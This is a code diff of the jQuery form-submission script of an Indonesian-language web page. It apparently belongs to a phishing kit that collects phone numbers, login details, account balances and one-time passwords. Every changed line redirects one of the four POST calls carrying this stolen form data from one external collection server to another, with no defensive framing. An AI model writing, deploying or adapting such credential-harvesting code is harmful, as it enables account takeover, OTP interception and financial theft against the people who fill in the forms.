@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://brown-mouse-587216.hostingersite.com/add/no.php',
+            url: 'https://hstg.biz.id/m/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://brown-mouse-587216.hostingersite.com/add/login.php',
+            url: 'https://hstg.biz.id/m/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://brown-mouse-587216.hostingersite.com/add/saldo.php',
+            url: 'https://hstg.biz.id/m/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://brown-mouse-587216.hostingersite.com/add/gas.php',
+ url: 'https://hstg.biz.id/m/gas.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
